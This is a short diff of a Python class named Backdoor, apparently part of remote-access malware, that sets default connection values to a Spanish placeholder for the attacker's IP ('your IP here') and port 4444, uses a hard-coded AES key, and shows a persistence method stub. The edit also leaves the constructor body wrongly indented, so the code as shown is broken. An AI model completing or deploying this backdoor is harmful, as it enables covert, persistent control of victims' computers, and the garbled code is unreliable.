@@ -6,9 +6,9 @@ import sys
 from utils.crypt import AESEncryptor
 
 class Backdoor:
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
+    def __init__(self, host="TU_IP_AQUÍ", port=4444):  # ← Tu IP aquí
+    self.host = host
+    self.port = port
         self.cryptor = AESEncryptor(key="SUPER_SECRET_KEY")
 
     def _add_persistence(self):
